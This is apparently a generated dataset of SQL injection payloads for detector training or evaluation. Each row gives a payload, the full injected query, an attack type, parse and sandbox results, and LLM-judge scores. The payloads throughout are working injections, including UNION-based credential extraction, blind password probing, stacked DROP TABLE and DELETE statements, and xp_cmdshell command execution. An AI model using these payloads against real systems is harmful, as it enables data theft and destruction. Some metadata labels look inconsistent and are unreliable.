query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00012,-- OR '1'='1,SELECT * FROM products WHERE name LIKE '%-- OR '1'='1%',tautology,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00016,"name%' OR ASCII(SUBSTR(product_name, 1, 1))=97--","SELECT * FROM products WHERE name LIKE '%name%' OR ASCII(SUBSTR(product_name, 1, 1))=97--%'",tautology,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""Where"", ""Ascii"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00017,"name%' UNION ALL SELECT NULL, NULL, NULL, NULL#","SELECT * FROM products WHERE name LIKE '%name%' UNION ALL SELECT NULL, NULL, NULL, NULL#%'",tautology,search,1,0,0.0,True,mysql,"[""Null"", ""Table"", ""Star"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,union_based,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00018,name%'-- -,SELECT * FROM products WHERE name LIKE '%name%'-- -%',tautology,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00019,1' OR (SELECT 1 FROM users WHERE username='admin' LIMIT 1)=1--,SELECT * FROM products WHERE name LIKE '%1' OR (SELECT 1 FROM users WHERE username='admin' LIMIT 1)=1--%',tautology,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Limit"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00020,1' OR 1=1#,SELECT * FROM users WHERE id = 1' OR 1=1#,tautology,user_lookup,1,0,0.0,True,mysql,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00021,OR '1'='1,SELECT * FROM users WHERE id = OR '1'='1,tautology,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00022,"'/*"" OR 1=1 --","SELECT * FROM users WHERE id = '/*"" OR 1=1 --",tautology,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00023,1' AND EXISTS(SELECT 1 FROM system.users),SELECT * FROM users WHERE id = 1' AND EXISTS(SELECT 1 FROM system.users),tautology,user_lookup,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00024,(SELECT 1 FROM users WHERE id = 1) OR '1'='1',SELECT * FROM users WHERE id = (SELECT 1 FROM users WHERE id = 1) OR '1'='1',tautology,user_lookup,1,0,0.0,True,default,"[""Table"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,complete_query,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00025,"1' OR ASCII(SUBSTRING(username, 1, 1)) = 97 --","SELECT * FROM users WHERE id = 1' OR ASCII(SUBSTRING(username, 1, 1)) = 97 --",tautology,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""Where"", ""Ascii"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00026,1' OR LENGTH(password) > 0 AND 1=1,SELECT * FROM users WHERE id = 1' OR LENGTH(password) > 0 AND 1=1,tautology,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""GT"", ""Or"", ""Column"", ""From"", ""And"", ""Identifier"", ""Literal"", ""Select"", ""Where"", ""Length"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00027,)# OR '1'='1 --,SELECT * FROM users WHERE id = )# OR '1'='1 --,tautology,user_lookup,1,0,0.0,True,mysql,"[""Table"", ""Star"", ""Paren"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00029,"1' AND ASCII(SUBSTRING(username,1,1)) <= 97 --","SELECT * FROM orders WHERE status = '1' AND ASCII(SUBSTRING(username,1,1)) <= 97 --' ORDER BY date DESC",tautology,order_filter,1,0,0.0,True,default,"[""LTE"", ""Table"", ""Star"", ""Column"", ""From"", ""And"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""Where"", ""Ascii"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00030,-1 OR (SELECT 1 FROM users WHERE role = 'admin')--,SELECT * FROM orders WHERE status = '-1 OR (SELECT 1 FROM users WHERE role = 'admin')--' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Table"", ""Neg"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00031,' OR 1>0; DROP TABLE logs;,SELECT * FROM orders WHERE status = '' OR 1>0; DROP TABLE logs;' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""GT"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Drop"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00034,"-- OR '1'<'1""","SELECT * FROM orders WHERE status = '-- OR '1'<'1""' ORDER BY date DESC",tautology,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00036,"%' OR '1' LIKE '%' --""","SELECT * FROM orders WHERE status = '%' OR '1' LIKE '%' --""' ORDER BY date DESC",tautology,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Like"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00037,--' OR 1=1,SELECT * FROM orders WHERE status = '--' OR 1=1' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00038,' OR 1=CAST(1 AS BIT),SELECT * FROM orders WHERE status = '' OR 1=CAST(1 AS BIT)' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Cast"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""DataType"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00039,/*' OR */1=1,SELECT * FROM orders WHERE status = '/*' OR */1=1' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Literal"", ""EQ""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00040,%' OR 1=ASCII('a'),SELECT * FROM orders WHERE status = '%' OR 1=ASCII('a')' ORDER BY date DESC,tautology,order_filter,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Where"", ""Ascii"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00041,' AND 1=1 --,"INSERT INTO comments (user_id, body) VALUES (1, '' AND 1=1 --')",tautology,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00043,'; SELECT * FROM users WHERE id = '1';--,"INSERT INTO comments (user_id, body) VALUES (1, ''; SELECT * FROM users WHERE id = '1';--')",tautology,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00045,'; SELECT * FROM comments WHERE user_id < 1 OR 1=1 ORDER BY body--,"INSERT INTO comments (user_id, body) VALUES (1, ''; SELECT * FROM comments WHERE user_id < 1 OR 1=1 ORDER BY body--')",tautology,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Order"", ""Or"", ""Column"", ""From"", ""EQ"", ""Identifier"", ""Select"", ""Ordered"", ""Where"", ""Literal"", ""LT""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00046,'); DROP TABLE IF EXISTS temp_table; --,"INSERT INTO comments (user_id, body) VALUES (1, ''); DROP TABLE IF EXISTS temp_table; --')",tautology,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Paren"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Drop"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00048,'; EXEC xp_cmdshell 'echo Vulnerable > C:\Vulnerable.txt' --,"INSERT INTO comments (user_id, body) VALUES (1, ''; EXEC xp_cmdshell 'echo Vulnerable > C:\Vulnerable.txt' --')",tautology,comment_insert,1,0,0.0,True,postgres,"[""Table"", ""Star"", ""Column"", ""From"", ""Command"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00049,--' OR 1=1/*,"INSERT INTO comments (user_id, body) VALUES (1, '--' OR 1=1/*')",tautology,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00050,' OR CAST(1 AS BIT)=CAST(1 AS BIT) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR CAST(1 AS BIT)=CAST(1 AS BIT) --')",tautology,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Cast"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""DataType"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00051,'; DELETE FROM comments WHERE user_id = 1;,"INSERT INTO comments (user_id, body) VALUES (1, ''; DELETE FROM comments WHERE user_id = 1;')",tautology,comment_insert,1,0,0.0,True,default,"[""Table"", ""Star"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""Delete"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00052,"--' OR SUBSTRING((SELECT name FROM sysobjects WHERE xtype='U'),1,1)='u' --","INSERT INTO comments (user_id, body) VALUES (1, '--' OR SUBSTRING((SELECT name FROM sysobjects WHERE xtype='U'),1,1)='u' --')",tautology,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00053,"\') UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='public'--","SELECT * FROM users WHERE username = '\') UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='public'--' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Paren"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00054,' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --,SELECT * FROM users WHERE username = '' OR EXISTS(SELECT 1 FROM products WHERE price < 100) --' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""LT"", ""Or"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00055,"' OR IF((SELECT COUNT(*) FROM admin), 1, 0) > 0 --","SELECT * FROM users WHERE username = '' OR IF((SELECT COUNT(*) FROM admin), 1, 0) > 0 --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""GT"", ""Or"", ""Count"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Select"", ""If"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00056,"' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin') = 65 --","SELECT * FROM users WHERE username = '' OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin') = 65 --' AND password = 'anything'",union_based,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Substring"", ""Subquery"", ""Ascii"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00057,' OR CAST((SELECT version() FROM pg_version() FOR SYSTEM_TIME AS OF TIMESTAMP 'now') AS VARCHAR) LIKE '%PostgreSQL%' --,SELECT * FROM users WHERE username = '' OR CAST((SELECT version() FROM pg_version() FOR SYSTEM_TIME AS OF TIMESTAMP 'now') AS VARCHAR) LIKE '%PostgreSQL%' --' AND password = 'anything',union_based,login,1,0,0.0,True,tsql,"[""Table"", ""Star"", ""Anonymous"", ""Cast"", ""Or"", ""Version"", ""Where"", ""Column"", ""From"", ""Like"", ""Identifier"", ""Select"", ""DataType"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00058,' OR CAST((SELECT @@version FROM sys.dm_os_sys_info) AS NVARCHAR(128)) LIKE '%Microsoft SQL Server%' --,SELECT * FROM users WHERE username = '' OR CAST((SELECT @@version FROM sys.dm_os_sys_info) AS NVARCHAR(128)) LIKE '%Microsoft SQL Server%' --' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Var"", ""DataTypeParam"", ""Table"", ""Star"", ""Cast"", ""Or"", ""Where"", ""Column"", ""From"", ""Like"", ""Identifier"", ""Parameter"", ""Select"", ""DataType"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00061,' OR (SELECT 1 FROM information_schema.tables WHERE table_schema = 'dbo' AND table_name LIKE 'users%') --,SELECT * FROM users WHERE username = '' OR (SELECT 1 FROM information_schema.tables WHERE table_schema = 'dbo' AND table_name LIKE 'users%') --' AND password = 'anything',union_based,login,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Like"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00062,--';SELECT * FROM users;,SELECT * FROM products WHERE name LIKE '%--';SELECT * FROM users;%',union_based,search,1,0,0.0,True,default,[],True,complete_query,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00064,"/*' OR 1=1 UNION SELECT email, phone FROM customers*/ --","SELECT * FROM products WHERE name LIKE '%/*' OR 1=1 UNION SELECT email, phone FROM customers*/ --%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00066,"' UNION SELECT username, password FROM users--","SELECT * FROM products WHERE name LIKE '%' UNION SELECT username, password FROM users--%'",union_based,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00067,"' OR 1=1 UNION SELECT column_name, table_schema FROM information_schema.columns--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 UNION SELECT column_name, table_schema FROM information_schema.columns--%'",union_based,search,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00068,"' AND (SELECT COUNT(*) FROM users WHERE user_id = 1) > 0 UNION SELECT NULL, NULL, NULL--","SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM users WHERE user_id = 1) > 0 UNION SELECT NULL, NULL, NULL--%'",union_based,search,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""GT"", ""Union"", ""Count"", ""Where"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00071,"--';UNION SELECT username, password FROM users;--","SELECT * FROM products WHERE name LIKE '%--';UNION SELECT username, password FROM users;--%'",union_based,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00072,"' OR 1=1 UNION SELECT dbms_session.get_context_info(null), null FROM dual;--","SELECT * FROM products WHERE name LIKE '%' OR 1=1 UNION SELECT dbms_session.get_context_info(null), null FROM dual;--%'",union_based,search,1,0,0.0,True,default,"[""Null"", ""Table"", ""Star"", ""Anonymous"", ""Or"", ""Union"", ""Where"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Select"", ""Dot"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00073,"/*' OR */ (SELECT 1 FROM users WHERE 1=2 UNION SELECT username, password FROM users);--","SELECT * FROM products WHERE name LIKE '%/*' OR */ (SELECT 1 FROM users WHERE 1=2 UNION SELECT username, password FROM users);--%'",union_based,search,1,0,0.0,True,default,"[""Table"", ""Union"", ""Where"", ""Column"", ""From"", ""Semicolon"", ""Identifier"", ""Select"", ""Subquery"", ""Literal"", ""EQ""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00074,"1' OR 1=1 UNION SELECT username, password FROM admin --","SELECT * FROM users WHERE id = 1' OR 1=1 UNION SELECT username, password FROM admin --",union_based,user_lookup,1,0,0.0,True,default,"[""Table"", ""Star"", ""Or"", ""Union"", ""Column"", ""From"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00075,'; DECLARE @t TABLE(id INT); INSERT INTO @t VALUES(1); SELECT * FROM users INNER JOIN @t ON users.id=@t.id--,SELECT * FROM users WHERE id = '; DECLARE @t TABLE(id INT); INSERT INTO @t VALUES(1); SELECT * FROM users INNER JOIN @t ON users.id=@t.id--,union_based,user_lookup,1,0,0.0,True,postgres,"[""Var"", ""Table"", ""Tuple"", ""Star"", ""Insert"", ""Where"", ""Join"", ""Column"", ""From"", ""Command"", ""Identifier"", ""Parameter"", ""Select"", ""Dot"", ""Literal"", ""Values"", ""EQ""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00076,"1') AND EXISTS(SELECT * FROM system_tables WHERE table_name='users') UNION ALL SELECT column_name, data_type FROM system_columns WHERE table_name='users'--","SELECT * FROM users WHERE id = 1') AND EXISTS(SELECT * FROM system_tables WHERE table_name='users') UNION ALL SELECT column_name, data_type FROM system_columns WHERE table_name='users'--",union_based,user_lookup,1,0,0.0,True,default,"[""Table"", ""Exists"", ""Star"", ""Paren"", ""Union"", ""Column"", ""From"", ""And"", ""Identifier"", ""Select"", ""Where"", ""Literal"", ""EQ""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00077,"--""; SELECT * FROM employees WHERE id = (SELECT id FROM users WHERE username = 'admin') --""","SELECT * FROM users WHERE id = --""; SELECT * FROM employees WHERE id = (SELECT id FROM users WHERE username = 'admin') --""",union_based,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
